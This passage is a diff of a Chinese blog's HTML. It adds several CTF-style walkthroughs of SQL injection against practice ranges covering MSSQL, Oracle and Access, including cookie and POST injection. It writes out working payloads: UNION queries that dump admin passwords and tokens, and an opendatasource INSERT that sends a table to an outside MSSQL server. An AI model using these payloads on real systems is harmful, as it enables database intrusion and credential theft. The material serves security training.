果等，这些都是注入攻击中常遇到的问题。为了解决以上疑难杂症，比较好的解决方法就是使用反弹注入技术，而反弹注入技术需要依靠opendatasource函数支持。"><a href="#MSSQL显错注入-在讲MSSQL反弹注入前先说一下MSSQL的显错注入-MSSQL联合查询：UNION-ALL-然后猜出输出点要使用null去填充，比如：-没有sql的union-select-1-2-3-改为-union-all-select-null-null-null-注释：注释只有–-select-name-from-master-dbo-sysdatabase-查询系统库-查询系统表：dbo-sysobjects-查询系统表-xtype-”U”-dbo-syscolumns-字段-id-指定id-反弹注入：-反弹注入就是在目标数据库进行查询并把结果通过网络保存在一个拥有公网ip的系统的数据库内-需要用到opendatasource函数-—-title-MSSQL注入-反弹注入-通过观察或者order-by可以得出这里有三个字段，输入一下语句：-id-1’union-all-select-null-null-null-from-admin–-注意两点：union后面的all和联合查询的字段档位不使用数字，全使用null，接下来按系统自带库进行一步一步查询，其实和mysql没什么区别。-通过以下语句：-id-2’-and-1-2-union-all-select-null-null-null-from-dbo-sysobjects–-id-2’-and-1-2-union-all-select-null-null-null-from-dbo-sysobjects-where-xtype-’u’–-id-2’-and-1-2-union-all-select-id-name-null-from-dbo-sysobjects-where-xtype-’u’–-id-2’-and-1-2-union-all-select-id-name-null-from-dbo-sysobjects-where-id-1977058079–-id-2’-and-1-2-union-all-select-id-passwd-token-from-admin–-MSSQL注入攻击是最为复杂的数据库攻击技术，由于该数据库功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖独特的攻击思路。我们在进行SQL注入时明明是sql注入点却无法进行注入，注入工具猜解速度异常缓慢，错误提示信息关闭，无法返回注入结果等，这些都是注入攻击中常遇到的问题。为了解决以上疑难杂症，比较好的解决方法就是使用反弹注入技术，而反弹注入技术需要依靠opendatasource函数支持。" class="headerlink" title="MSSQL显错注入 在讲MSSQL反弹注入前先说一下MSSQL的显错注入 MSSQL联合查询：UNION ALL 然后猜出输出点要使用null去填充，比如： 没有sql的union select 1,2,3 改为 union all select null,null,null 注释：注释只有– select name from master.dbo.sysdatabase 查询系统库 查询系统表：dbo.sysobjects 查询系统表 (xtype=”U”) dbo.syscolumns 字段 (id=) 指定id 反弹注入： 反弹注入就是在目标数据库进行查询并把结果通过网络保存在一个拥有公网ip的系统的数据库内 需要用到opendatasource函数 — title: MSSQL注入-反弹注入 通过观察或者order by可以得出这里有三个字段，输入一下语句：  id=1’union all select null,null,null from admin– 注意两点：union后面的all和联合查询的字段档位不使用数字，全使用null，接下来按系统自带库进行一步一步查询，其实和mysql没什么区别。 通过以下语句： id=2’ and 1=2 union all select null,null,null from dbo.sysobjects–  id=2’ and 1=2 union all select null,null,null from dbo.sysobjects where xtype=’u’–  id=2’ and 1=2 union all select id,name,null from dbo.sysobjects where xtype=’u’–  id=2’ and 1=2 union all select id,name,null from dbo.sysobjects where id=1977058079–  id=2’ and 1=2 union all select id,passwd,token from admin–  MSSQL注入攻击是最为复杂的数据库攻击技术，由于该数据库功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖独特的攻击思路。我们在进行SQL注入时明明是sql注入点却无法进行注入，注入工具猜解速度异常缓慢，错误提示信息关闭，无法返回注入结果等，这些都是注入攻击中常遇到的问题。为了解决以上疑难杂症，比较好的解决方法就是使用反弹注入技术，而反弹注入技术需要依靠opendatasource函数支持。"></a>MSSQL显错注入 在讲MSSQL反弹注入前先说一下MSSQL的显错注入 MSSQL联合查询：UNION ALL 然后猜出输出点要使用null去填充，比如： 没有sql的union select 1,2,3 改为 union all select null,null,null 注释：注释只有– select name from master.dbo.sysdatabase 查询系统库 查询系统表：dbo.sysobjects 查询系统表 (xtype=”U”) dbo.syscolumns 字段 (id=) 指定id 反弹注入： 反弹注入就是在目标数据库进行查询并把结果通过网络保存在一个拥有公网ip的系统的数据库内 需要用到opendatasource函数 <img src="/upload/md/19822ee108e5d68b89f503e2600558b2_43312.png" alt>— title: MSSQL注入-反弹注入 通过观察或者order by可以得出这里有三个字段，输入一下语句： <img src="/upload/md/777ed1e9541eac35aea3c5e93c408be5_28022.png" alt> id=1’union all select null,null,null from admin– 注意两点：union后面的all和联合查询的字段档位不使用数字，全使用null，接下来按系统自带库进行一步一步查询，其实和mysql没什么区别。 通过以下语句： id=2’ and 1=2 union all select null,null,null from dbo.sysobjects– <img src="/upload/md/af28d35b238e014863799a404a00e9f6_71063.png" alt> id=2’ and 1=2 union all select null,null,null from dbo.sysobjects where xtype=’u’– <img src="/upload/md/e890610ed70998cdedab1d08930860a8_58107.png" alt> id=2’ and 1=2 union all select id,name,null from dbo.sysobjects where xtype=’u’– <img src="/upload/md/1f1c6b4d8336aa1dbf365351cf70ef4b_19038.png" alt> id=2’ and 1=2 union all select id,name,null from dbo.sysobjects where id=1977058079– <img src="/upload/md/7d278cda303c0a50bc403fcde5016835_20520.png" alt> id=2’ and 1=2 union all select id,passwd,token from admin– <img src="/upload/md/f50b99cc32a82f7ea35c968406c0b1ea_60786.png" alt> MSSQL注入攻击是最为复杂的数据库攻击技术，由于该数据库功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖独特的攻击思路。我们在进行SQL注入时明明是sql注入点却无法进行注入，注入工具猜解速度异常缓慢，错误提示信息关闭，无法返回注入结果等，这些都是注入攻击中常遇到的问题。为了解决以上疑难杂症，比较好的解决方法就是使用反弹注入技术，而反弹注入技术需要依靠<strong>opendatasource</strong>函数支持。</h3><h4 id="环境搭建-MSSQL注入-反弹注入实际上就是把查询出来的数据发到我们的MSSQL服务器上，那么我们就需要自己搭建MSSQL数据库和一个公网ip，这里有一个虚拟空间，可以免去MSSQL安装环境并且不需要特意购置云服务器来获取公网ip。-虚拟空间：香港云-这个香港云注册还需要邮箱，我一般不填真实信息，所以找了个10分钟邮箱-免费邮箱：10分钟邮箱"><a href="#环境搭建-MSSQL注入-反弹注入实际上就是把查询出来的数据发到我们的MSSQL服务器上，那么我们就需要自己搭建MSSQL数据库和一个公网ip，这里有一个虚拟空间，可以免去MSSQL安装环境并且不需要特意购置云服务器来获取公网ip。-虚拟空间：香港云-这个香港云注册还需要邮箱，我一般不填真实信息，所以找了个10分钟邮箱-免费邮箱：10分钟邮箱" class="headerlink" title="环境搭建 MSSQL注入-反弹注入实际上就是把查询出来的数据发到我们的MSSQL服务器上，那么我们就需要自己搭建MSSQL数据库和一个公网ip，这里有一个虚拟空间，可以免去MSSQL安装环境并且不需要特意购置云服务器来获取公网ip。 虚拟空间：香港云 这个香港云注册还需要邮箱，我一般不填真实信息，所以找了个10分钟邮箱 免费邮箱：10分钟邮箱"></a>环境搭建 MSSQL注入-反弹注入实际上就是把查询出来的数据发到我们的MSSQL服务器上，那么我们就需要自己搭建MSSQL数据库和一个公网ip，这里有一个虚拟空间，可以免去MSSQL安装环境并且不需要特意购置云服务器来获取公网ip。 虚拟空间：<a href="http://www.webweb.com" target="_blank" rel="noopener">香港云</a> 这个香港云注册还需要邮箱，我一般不填真实信息，所以找了个10分钟邮箱 免费邮箱：<a href="http://bccto.me" target="_blank" rel="noopener">10分钟邮箱</a></h4><h4 id="opendatasource函数-语法：opendatasource-provider-name-init-string-provider-name：-注册为用于访问数据源的OLE-DB提供程序的PROGID的名称，MSSQL的名称为SQLOLEDB-init-string-链接字符串-链接地址，端口，用户名，密码，数据库名-sever-链接地址，端口-uid-用户名-pwd-密码-database-数据库名称-实现功能-获取所有库-当前库所有表-表里所有内容-分区路径-本机建立库和表-方便反弹时写进东西-然后最重要的一步来了，向靶场插入以下代码：-insert-into-opendatasource-39-sqloledb-39-39-server-SQL5006-webweb-com-1433-uid-DB-14A8E52-ddcms-admin-pwd-123456789-database-DB-14A8E52-ddcms-39-DB-14A8E52-ddcms-dbo-a-select-from-admin-没有报错，接下来到我们的MSSQL-Manager的Run-Query上查看。-当然前提是在这个数据库下有这个表-create-table-a-in-int-name1-char-255-name2-char-255-naem3-char-255-最后得到flag。"><a href="#opendatasource函数-语法：opendatasource-provider-name-init-string-provider-name：-注册为用于访问数据源的OLE-DB提供程序的PROGID的名称，MSSQL的名称为SQLOLEDB-init-string-链接字符串-链接地址，端口，用户名，密码，数据库名-sever-链接地址，端口-uid-用户名-pwd-密码-database-数据库名称-实现功能-获取所有库-当前库所有表-表里所有内容-分区路径-本机建立库和表-方便反弹时写进东西-然后最重要的一步来了，向靶场插入以下代码：-insert-into-opendatasource-39-sqloledb-39-39-server-SQL5006-webweb-com-1433-uid-DB-14A8E52-ddcms-admin-pwd-123456789-database-DB-14A8E52-ddcms-39-DB-14A8E52-ddcms-dbo-a-select-from-admin-没有报错，接下来到我们的MSSQL-Manager的Run-Query上查看。-当然前提是在这个数据库下有这个表-create-table-a-in-int-name1-char-255-name2-char-255-naem3-char-255-最后得到flag。" class="headerlink" title="opendatasource函数 语法：opendatasource(provider_name,init_string) provider_name： 注册为用于访问数据源的OLE DB提供程序的PROGID的名称，MSSQL的名称为SQLOLEDB init_string: 链接字符串 链接地址，端口，用户名，密码，数据库名 sever=链接地址，端口;uid=用户名;pwd=密码;database=数据库名称 实现功能: 获取所有库.当前库所有表.表里所有内容.分区路径. 本机建立库和表,方便反弹时写进东西. 然后最重要的一步来了，向靶场插入以下代码： insert into opendatasource(&#39;sqloledb&#39;,&#39;server=SQL5006.webweb.com,1433;uid=DB_14A8E52_ddcms_admin;pwd=123456789;database=DB_14A8E52_ddcms&#39;).DB_14A8E52_ddcms .dbo.a select * from admin-- 没有报错，接下来到我们的MSSQL Manager的Run Query上查看。  当然前提是在这个数据库下有这个表  create table a(in int,name1 char(255),name2 char(255),naem3 char(255)); 最后得到flag。"></a>opendatasource函数 语法：<strong>opendatasource(provider_name,init_string)</strong> <strong>provider_name</strong>： 注册为用于访问数据源的OLE DB提供程序的PROGID的名称，MSSQL的名称为SQLOLEDB <strong>init_string</strong>: 链接字符串 链接地址，端口，用户名，密码，数据库名 sever=链接地址，端口;uid=用户名;pwd=密码;database=数据库名称 <strong>实现功能:</strong> 获取所有库.当前库所有表.表里所有内容.分区路径. 本机建立库和表,方便反弹时写进东西. 然后最重要的一步来了，向靶场插入以下代码： <code>insert into opendatasource(&#39;sqloledb&#39;,&#39;server=SQL5006.webweb.com,1433;uid=DB_14A8E52_ddcms_admin;pwd=123456789;database=DB_14A8E52_ddcms&#39;).DB_14A8E52_ddcms .dbo.a select * from admin--</code> 没有报错，接下来到我们的MSSQL Manager的Run Query上查看。 <img src="/upload/md/b90258b700dc374263bf09e346c7d8d2_19539.png" alt> 当然前提是在这个数据库下有这个表 <img src="/upload/md/69b2588a7c596138caec23407f71c76a_93708.png" alt> <code>create table a(in int,name1 char(255),name2 char(255),naem3 char(255));</code> 最后得到flag。</h4>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/20/mssql注入/" data-id="ck1z1u10t0005ycv0rdlmlgl2" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-oracle注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/oracle注入/" class="article-date">
+  <time datetime="2019-10-20T13:47:47.000Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/20/oracle注入/">oracle注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。Oracle数据库系统是目前世界上流行的关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小、微机环境。它是一种高效率、可靠性好的 适应高吞吐量的数据库解决方案。 </p>
+<h3 id="基础知识-1-Oracle-使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用dual，dual是Oracle的虚拟表，用来构成select的语法规则。Oracle的dual表里面永远只有一条记录X。-2-Oracle的数据类型是强匹配的-MYSQL是弱匹配-，所以在Oracle进行类似UNION查询数据时候必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用null代替某些无法快速猜测出数据类型的位置。-3-Oracle的单行注释符号是–，多行注释符号-。-4-获取数据库版本："><a href="#基础知识-1-Oracle-使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用dual，dual是Oracle的虚拟表，用来构成select的语法规则。Oracle的dual表里面永远只有一条记录X。-2-Oracle的数据类型是强匹配的-MYSQL是弱匹配-，所以在Oracle进行类似UNION查询数据时候必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用null代替某些无法快速猜测出数据类型的位置。-3-Oracle的单行注释符号是–，多行注释符号-。-4-获取数据库版本：" class="headerlink" title="基础知识 1.Oracle 使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用dual，dual是Oracle的虚拟表，用来构成select的语法规则。Oracle的dual表里面永远只有一条记录X。 2.Oracle的数据类型是强匹配的(MYSQL是弱匹配)，所以在Oracle进行类似UNION查询数据时候必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用null代替某些无法快速猜测出数据类型的位置。 3.Oracle的单行注释符号是–，多行注释符号/**/。 4.获取数据库版本： "></a>基础知识 1.Oracle 使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用dual，dual是Oracle的虚拟表，用来构成select的语法规则。Oracle的dual表里面永远只有一条记录X。 2.Oracle的数据类型是强匹配的(MYSQL是弱匹配)，所以在Oracle进行类似UNION查询数据时候必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用null代替某些无法快速猜测出数据类型的位置。 3.Oracle的单行注释符号是–，多行注释符号/**/。 4.获取数据库版本： <figure class="highlight plain"><figcaption><span>1</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">### 实战靶场 首先输入一个单引号判断是否存在注入点。 ![](/upload/md/a0d846c7cb14733628301ef60086a30d_45037.png) 明显存在注入点，并且回显了ORA-01756，这明显是orale的数据库。接下来可以判断这几个字段的数据类型,把字段为改成相应的数据类型，若回显正确则，这个字段位就是这个数据类型，反之则不是。例如下面可确定第一个字段是数据类型。 ![](/upload/md/e4fa612c4d23351682f86559d608e746_75969.png) 通过select * from all_tables查询出所有表 ![](/upload/md/49bcf252958e0c73861ebf02c854fcf0_87398.png) 查询当前用户表：select * from user_tables ![](/upload/md/fe2580cda571e5c55e64dd4073cbcc64_82156.png) 发现当前用户只有news表和admin表，接下来查询这两个表的字段 select * from user_tab_columns ![](/upload/md/f1b36e9a72a0345df04fc91aa402a4e1_54879.png) 接下来select * from admin查看admin表的数据 ![](/upload/md/3f81c77910b3252c36029c6d4ec6bdce_85322.png) ``` &apos; and (select count(*) from admin)&lt;&gt;0-- ``` 返回正常。说明存在admin表。如果返回错误，可将admin改为username、manage等常用表名继续猜解 ``` &apos;and (select count(*) from admin)=1-- ``` 返回正常说明只有一个管理员,爆数据第一个表 ``` &apos;and 1=2 union all select 1,(select table_name from user_tables where rownum=1),null from dual-- ``` 可以这样爆第二个表 ``` &apos;and 1=2 union all select 1,(select table_name from user_tables where rownum=1 and table_name not in (&apos;第一个表&apos;)) from dual-- ``` 已知表的前提下，判断表中字段结构。 &apos;and (select count(user_name) from admin)&gt;=0-- 返回正常，说明存在name字段 &apos;and (select count(name) from admin)&gt;=0-- 返回错误，说明不存在pass字段 ``` &apos;and 1=2 union all select 1,(select column_name from user_tab_columns where rownum=1 and table_name=&apos;表名（大写的）&apos;),null from dual-- ``` 爆某表的第一个字段 ``` &apos;and 1=2 union all select 1,(select column_name from user_tab_columns where rownum=1 and table_name=&apos;表名&apos; and column_name not in (&apos;第一个字段&apos;)),null from dual-- ``` 爆表的第二个字段 爆其它字段以此类推 爆某表中的第一行数据： &apos;and 1=2 union select 1,字段1||字段2...||字段n from 表名 where rownum=1 --连接多个字段用到的连接符号是||,在oracle数据库中concat函数只能连接两个字符串。 以上的方法是字段是字符类型或者数字类型的，而靶场是使用二进制类型的数据存储方式，所以子查询是不能做的，可以使用盲注，但是很麻烦，所以利用一些特殊的函数进行报错注入。 ### 利用函数的报错注入 这里因为靶场不知为何挂了，演示不了，但是可以讲一下一些函数的报错注入方式。 </span><br><span class="line">#### utl_inaddr.get_host_name()函数 返回环境中的本主机名 ``` select UTL_INADDR.get_host_name() from dual; ``` 返回局域网内指定IP地址的主机名 ``` select UTL_INADDR.get_host_name(&apos;192.168.0.156&apos;) from dual; ``` 返回intrenet中指定IP地址的网址 Oracle的报错回显方法还有很多，比如利用函数之类的。因数量比较多，这里就不阐述了(百度有很多)。 #### CTXSYS.DRITHSX.SN()函数 ``` ctxsys.drithsx.sn(user,(select banner from v$version where rownum=1)) ``` 去查询关于主题的对应关键字，然后因为查询失败(应该是这个用户没有创建和查询的权限，默认情况没有创建，爆出未查询到的错误而爆出查询的内容) ``` and 1=ctxsys.dirthsx.sn(1,(select banner from sys.v_$version where rownum=1))--</span><br></pre></td></tr></table></figure></h3>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/20/oracle注入/" data-id="ck1z1u10v0007ycv0l6bp3u0o" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-access数据库偏移注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/access数据库偏移注入/" class="article-date">
+  <time datetime="2019-10-20T13:47:07.000Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/20/access数据库偏移注入/">access数据库偏移注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>在sql注入的时候会遇到一些无法查询列名的问题，比如系统自带的数据库的而权限不够而无法访问系统自带库。 当你猜到表名而无法字段名的时候，我们可以使用偏移注入，来查询那张表里的数据。 而sqlmap的方法就是爆字段名，如果字段名比较奇葩，那字典估计也就没办法了，只能使用偏移注入。</p>
+<h2 id="偏移注入步骤：偏移注入步骤：-1，判断注入点-2，order-by-判断长度-3-判断表名-4-联合查询-5-获取表中列数（知道存在几列以及输出点）-6-开始偏移注入"><a href="#偏移注入步骤：偏移注入步骤：-1，判断注入点-2，order-by-判断长度-3-判断表名-4-联合查询-5-获取表中列数（知道存在几列以及输出点）-6-开始偏移注入" class="headerlink" title="偏移注入步骤：偏移注入步骤： 1，判断注入点 2，order by 判断长度 3.判断表名 4.联合查询 5.获取表中列数（知道存在几列以及输出点） 6.开始偏移注入"></a>偏移注入步骤：偏移注入步骤： 1，判断注入点 2，order by 判断长度 3.判断表名 4.联合查询 5.获取表中列数（知道存在几列以及输出点） 6.开始偏移注入</h2><h6 id><a href="#" class="headerlink" title></a></h6><p>靶场：<br> <img src="/upload/md/271d2d0fa250d8668cc1f720b2bdb4f9_86573.png" alt><br> get请求有过滤，尝试cookie发现可以注入<br> <img src="/upload/md/0e3669ac99769a19cef1fa880cae947a_21612.png" alt><br>order by 判断长度：id=105+order+by+26<br> <img src="/upload/md/108ce58f633fcab3e98c53193c13435e_46853.png" alt><br>尝试damin表：id=105+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26+from+admin<br> <img src="/upload/md/0b082e1bc2ef69b8af809a49bbaab692_25071.png" alt><br> 用admin.<em>实施注入：id=105+union+select+1,2,3,4,5,6,7,8,9,10,admin.</em>+from+admin<br><img src="/upload/md/05f979ef5a0473ad51a7fef316046cb3_10736.png" alt><br> admin.<em>移到显示位 id=105+union+select+1,2,3,4,5,6,7,8,9,admin.</em>,11+from+admin<br><img src="/upload/md/bfe10aebd86e2261cbe7b6141b735c8d_25087.png" alt><br> 看图像的对应位置，出现flag：<br> <img src="/upload/md/6d4139b5fa246334f13eeb6a31d49ff5_74302.png" alt></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/20/access数据库偏移注入/" data-id="ck1z1u10o0001ycv09xhvntiw" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-access数据库cookie注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/access数据库cookie注入/" class="article-date">
+  <time datetime="2019-10-20T13:46:40.000Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/20/access数据库cookie注入/">access数据库cookie注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Microsoft-Office-Access是由微软发布的关系数据库管理系统。它结合了-MicrosoftJet-Database-Engine-和-图形用户界面两项特点，是Microsoft-Office-的系统程序之一，Microsoft-Office-Access是微软把数据库引擎的图形用户界面和软件开发工具结合在一起的一个数据库管理系统。"><a href="#Microsoft-Office-Access是由微软发布的关系数据库管理系统。它结合了-MicrosoftJet-Database-Engine-和-图形用户界面两项特点，是Microsoft-Office-的系统程序之一，Microsoft-Office-Access是微软把数据库引擎的图形用户界面和软件开发工具结合在一起的一个数据库管理系统。" class="headerlink" title="Microsoft Office Access是由微软发布的关系数据库管理系统。它结合了 MicrosoftJet Database Engine 和 图形用户界面两项特点，是Microsoft Office 的系统程序之一，Microsoft Office Access是微软把数据库引擎的图形用户界面和软件开发工具结合在一起的一个数据库管理系统。"></a>Microsoft Office Access是由微软发布的关系数据库管理系统。它结合了 MicrosoftJet Database Engine 和 图形用户界面两项特点，是Microsoft Office 的系统程序之一，Microsoft Office Access是微软把数据库引擎的图形用户界面和软件开发工具结合在一起的一个数据库管理系统。</h1><h2 id="它是微软OFFICE的一个成员-MS-ACCESS以它自己的格式将数据存储在基于Access-Jet的数据库引擎里。它还可以直接导入或者链接数据-这些数据存储在其他应用程序和数据库-。软件开发人员和数据架构师可以使用Microsoft-Access开发应用软件-“高级用户”可以使用它来构建软件应用程序。和其他办公应用程序一样，ACCESS支持Visual-Basic宏语言-它是一个面向对象的编程语言-可以引用各种对象，包括DAO-数据访问对象-ActiveX数据对象-以及许多其他的ActiveX组件。可视对象用于显示表和报表，他们的方法和属性是在VBA编程环境下，VBA代码模块可以声明和调用Windows操作系统函数。"><a href="#它是微软OFFICE的一个成员-MS-ACCESS以它自己的格式将数据存储在基于Access-Jet的数据库引擎里。它还可以直接导入或者链接数据-这些数据存储在其他应用程序和数据库-。软件开发人员和数据架构师可以使用Microsoft-Access开发应用软件-“高级用户”可以使用它来构建软件应用程序。和其他办公应用程序一样，ACCESS支持Visual-Basic宏语言-它是一个面向对象的编程语言-可以引用各种对象，包括DAO-数据访问对象-ActiveX数据对象-以及许多其他的ActiveX组件。可视对象用于显示表和报表，他们的方法和属性是在VBA编程环境下，VBA代码模块可以声明和调用Windows操作系统函数。" class="headerlink" title="它是微软OFFICE的一个成员, MS ACCESS以它自己的格式将数据存储在基于Access Jet的数据库引擎里。它还可以直接导入或者链接数据(这些数据存储在其他应用程序和数据库)。软件开发人员和数据架构师可以使用Microsoft Access开发应用软件,“高级用户”可以使用它来构建软件应用程序。和其他办公应用程序一样，ACCESS支持Visual Basic宏语言,它是一个面向对象的编程语言,可以引用各种对象，包括DAO(数据访问对象),ActiveX数据对象,以及许多其他的ActiveX组件。可视对象用于显示表和报表，他们的方法和属性是在VBA编程环境下，VBA代码模块可以声明和调用Windows操作系统函数。"></a>它是微软OFFICE的一个成员, MS ACCESS以它自己的格式将数据存储在基于Access Jet的数据库引擎里。它还可以直接导入或者链接数据(这些数据存储在其他应用程序和数据库)。软件开发人员和数据架构师可以使用Microsoft Access开发应用软件,“高级用户”可以使用它来构建软件应用程序。和其他办公应用程序一样，ACCESS支持Visual Basic宏语言,它是一个面向对象的编程语言,可以引用各种对象，包括DAO(数据访问对象),ActiveX数据对象,以及许多其他的ActiveX组件。可视对象用于显示表和报表，他们的方法和属性是在VBA编程环境下，VBA代码模块可以声明和调用Windows操作系统函数。</h2><hr>
+<p> <img src="/upload/md/8360c5e3ae560cdedf16a9f2a51c4435_53575.png" alt><br> 试着在url栏中注入，<br> <img src="/upload/md/9dfaf49c52b13f70c7c403198f8e1a45_61519.png" alt><br> 被防护了。 既然题目是cookie注入，那么我们就从cookie里提交参数试一下<br> <img src="/upload/md/4c4b3a64fa722a073488503e72b8f5b6_15682.png" alt><br>我们开始利用cookie进行注入<br> <img src="/upload/md/9d705025a61eac4aedd22d18cac2867b_34817.png" alt><br>order by 确定了是10个字段 union+select+1,2,3,4,5,6,7,8,9,10+from+admin<br> <img src="/upload/md/6d01579f457e8db7d9158bd4e8b00948_93717.png" alt><br> 找到了回显点，在把2换成username 7换成password,发现用户名根密码都爆破出来了。<br> <img src="/upload/md/98df6ec114f768772c3a271670b2e558_66726.png" alt><br> 在线cmd解码解出密码<br> <img src="/upload/md/26e3b95fb37b4d11a2badf5ecf207e44_10968.png" alt><br>登录后台，取flag <a href="http://59.63.200.79:8004/admin/login.php" target="_blank" rel="noopener">http://59.63.200.79:8004/admin/login.php</a></p>
+<p><img src="/upload/md/ca52ae25904b575ab6382bcafedcf494_45999.png" alt> #</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/20/access数据库cookie注入/" data-id="ck1z1u10j0000ycv08gbde2f6" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-post注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/post注入/" class="article-date">
+  <time datetime="2019-10-20T13:45:25.000Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/20/post注入/">post注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="简单介绍一下post传输数据的方式"><a href="#简单介绍一下post传输数据的方式" class="headerlink" title="简单介绍一下post传输数据的方式 #:"></a>简单介绍一下post传输数据的方式 #:</h1><h2 id="常见的存在post注入的地方-：-1、搜索框，-2、登录框，-3、认证框-……"><a href="#常见的存在post注入的地方-：-1、搜索框，-2、登录框，-3、认证框-……" class="headerlink" title=" ### 常见的存在post注入的地方 ###： 1、搜索框， 2、登录框， 3、认证框 ……"></a><img src="/upload/md/808deb889933ebeafe38eb3287513bed_11302.png" alt> ### 常见的存在post注入的地方 ###： 1、搜索框， 2、登录框， 3、认证框 ……</h2><p> 打开靶场，试着登录：<br><img src="/upload/md/761f758cdf8e61bd20f24076e8ab39fb_23071.png" alt><br> 万能密码：<br> <img src="/upload/md/ae104b31615e181ad5ae71051e7fd6b2_49568.png" alt> ### 说明这是存在注入的，我们用常规的sql显错注入方法： 和显错注入一样 使用database函数查看数据库名 得到数据库名为security ### !<br><a href="/upload/md/3a868798df45f6065e0f27b7632d6cff_72595.png"></a> ### 利用系统数据库表获取表名 ###<br><img src="/upload/md/92952e5b9e7727f4aacf1c14e2da0f63_68353.png" alt> ### 同样利用系统数据库表 获取表的字段名 这里只获取zkaq表 ###<br><img src="/upload/md/18f1f4753490a92b9ccdd44e811db473_97594.png" alt> ### 得到表名与字段名之后 查询表里的数据 拿到flag ###<br> <img src="/upload/md/1ed1033514f636b5c9c13f0e2f4861f1_79009.png" alt> ## 第二题： ##<br>原理相同 只是需要闭合双引号与括号<br><img src="/upload/md/abbf1764354a85cb20928e3e49810801_19609.png" alt> ## 第三题： ## 因为没有显示位，所以走盲注的延时注入流程拿到flag<br><img src="/upload/md/a2bc3c1dbf37f76c5bc6727068818ea4_49843.png" alt> 猜数据库名 使用盲注函数length() 用sqlmap跑出数据库命为security 跑出表为：emails referers uagents users zkaq 查询zkaq表 得出flag和zKaQ两个字段 查询字段中的内容，最后得到flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/20/post注入/" data-id="ck1z1u10y0009ycv0ok86dd2s" class="article-share-link">Share</a>
       
       
     </footer>
@@ -161,6 +437,11 @@
 
   
 
+
+  <nav id="page-nav">
+    
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+  </nav>
 
 </section>
         
@@ -191,11 +472,23 @@
       <ul>
         
           <li>
-            <a href="/2019/10/14/正则表达式/">正则表达式</a>
+            <a href="/2019/10/20/csrf/">csrf</a>
           </li>
         
           <li>
-            <a href="/2019/10/14/hello-world/">Hello World</a>
+            <a href="/2019/10/20/dom型xss/">dom型xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/存储型xss/">存储型xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/反射性xss/">反射性xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/dns注入/">dns注入</a>
           </li>
         
       </ul>
